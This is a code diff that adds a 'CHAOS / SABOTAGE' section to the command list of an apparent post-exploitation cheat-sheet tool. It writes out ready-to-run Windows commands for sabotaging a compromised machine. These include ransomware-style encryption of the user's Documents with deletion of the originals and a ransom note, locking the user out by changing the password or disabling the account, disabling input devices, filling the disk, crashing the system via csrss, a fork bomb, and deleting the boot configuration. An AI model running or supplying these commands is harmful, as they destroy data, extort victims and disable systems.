@@ -2960,6 +2960,177 @@ const COMMANDS = [
     tags: ["reference", "recon"],
     accent: "#607d8b"
   },
+  // ═══════════════════════════════════════════════════════════════
+  // CHAOS / SABOTAGE - Run as NT AUTHORITY\SYSTEM
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[CHAOS] Undeletable File on Desktop",
+    code: "echo 'YOU HAVE BEEN PWNED' > C:\\Users\\adminvm1\\Desktop\\PWNED.txt; takeown /f C:\\Users\\adminvm1\\Desktop\\PWNED.txt /a; icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /setowner 'NT AUTHORITY\\SYSTEM'; icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /inheritance:r; icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /grant:r 'NT AUTHORITY\\SYSTEM':F; icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /deny adminvm1:(DE,DC)",
+    tags: ["cmd", "chaos", "postexploit"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Send Popup Message to User",
+    code: "msg * 'Your system has been compromised. - PSYCHO'",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Send Message to Specific Session",
+    code: "msg SESSION_ID 'You have been hacked.'",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Change Wallpaper",
+    code: "reg add 'HKCU\\Control Panel\\Desktop' /v Wallpaper /t REG_SZ /d C:\\Windows\\Temp\\pwned.jpg /f; RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Set Wallpaper for All Users",
+    code: "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP' /v DesktopImagePath /t REG_SZ /d C:\\Windows\\Temp\\pwned.jpg /f; reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP' /v DesktopImageStatus /t REG_DWORD /d 1 /f",
+    tags: ["cmd", "chaos", "persist"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Encrypt User's Files (7zip)",
+    code: "IWR -Uri 'https://www.7-zip.org/a/7z2301-x64.exe' -OutFile C:\\Windows\\Temp\\7z.exe; C:\\Windows\\Temp\\7z.exe /S; & 'C:\\Program Files\\7-Zip\\7z.exe' a -p'YOURPASSWORD' -mhe=on C:\\Windows\\Temp\\encrypted.7z C:\\Users\\adminvm1\\Documents\\*",
+    tags: ["ps", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Delete Original After Encrypt",
+    code: "Remove-Item C:\\Users\\adminvm1\\Documents\\* -Recurse -Force; Copy-Item C:\\Windows\\Temp\\README.txt C:\\Users\\adminvm1\\Documents\\",
+    tags: ["ps", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Create Ransom Note",
+    code: "echo 'Your files have been encrypted. Contact psycho@proton.me for recovery.' > C:\\Users\\adminvm1\\Desktop\\README.txt",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Lock User Out (Change Password)",
+    code: "net user adminvm1 H4CK3D123!",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Disable User Account",
+    code: "net user adminvm1 /active:no",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Force Logoff User",
+    code: "logoff SESSION_ID",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Continuous Logoff (Annoying)",
+    code: "while ($true) { quser | Select-String 'adminvm1' | ForEach-Object { $id = ($_ -split '\\s+')[3]; logoff $id }; Start-Sleep 5 }",
+    tags: ["ps", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Open Websites in Loop",
+    code: "while ($true) { Start-Process 'https://youtu.be/dQw4w9WgXcQ'; Start-Sleep 10 }",
+    tags: ["ps", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Speak Through Speakers",
+    code: "Add-Type -AssemblyName System.Speech; $s = New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak('You have been hacked')",
+    tags: ["ps", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Flip Screen Upside Down",
+    code: "Add-Type -TypeDefinition @'\\nusing System;using System.Runtime.InteropServices;\\npublic class Display{[DllImport(\"user32.dll\")]public static extern int EnumDisplaySettings(string a,int b,ref DEVMODE c);[DllImport(\"user32.dll\")]public static extern int ChangeDisplaySettings(ref DEVMODE a,int b);[StructLayout(LayoutKind.Sequential)]public struct DEVMODE{[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmDeviceName;public short dmSpecVersion;public short dmDriverVersion;public short dmSize;public short dmDriverExtra;public int dmFields;public int dmPositionX;public int dmPositionY;public int dmDisplayOrientation;public int dmDisplayFixedOutput;public short dmColor;public short dmDuplex;public short dmYResolution;public short dmTTOption;public short dmCollate;[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmFormName;public short dmLogPixels;public int dmBitsPerPel;public int dmPelsWidth;public int dmPelsHeight;public int dmDisplayFlags;public int dmDisplayFrequency;}}\\n'@",
+    tags: ["ps", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Disable Keyboard",
+    code: "rundll32 keyboard,disable",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Disable Mouse",
+    code: "rundll32 mouse,disable",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Hide All Desktop Icons",
+    code: "reg add 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced' /v HideIcons /t REG_DWORD /d 1 /f; Stop-Process -Name explorer -Force; Start-Process explorer",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Hide Taskbar",
+    code: "reg add 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3' /v Settings /t REG_BINARY /d 30000000feffffff... /f",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Delete Recycle Bin Contents",
+    code: "Clear-RecycleBin -Force -ErrorAction SilentlyContinue",
+    tags: ["ps", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Fill Disk with Garbage",
+    code: "fsutil file createnew C:\\Windows\\Temp\\garbage.bin 10737418240",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Spawn Infinite Notepad",
+    code: "while ($true) { Start-Process notepad; Start-Sleep 1 }",
+    tags: ["ps", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Kill Explorer Loop",
+    code: "while ($true) { Stop-Process -Name explorer -Force; Start-Sleep 3 }",
+    tags: ["ps", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Shutdown in 60 Seconds",
+    code: "shutdown /s /t 60 /c 'Your system will shutdown in 60 seconds. - PSYCHO'",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Cancel Shutdown",
+    code: "shutdown /a",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] BSOD (Blue Screen)",
+    code: "wmic process where name='csrss.exe' delete",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Fork Bomb (Careful!)",
+    code: "%0|%0",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS] Corrupt Boot (DANGEROUS)",
+    code: "bcdedit /delete {default}",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
 ];
 
 const list = document.getElementById('cmdList');
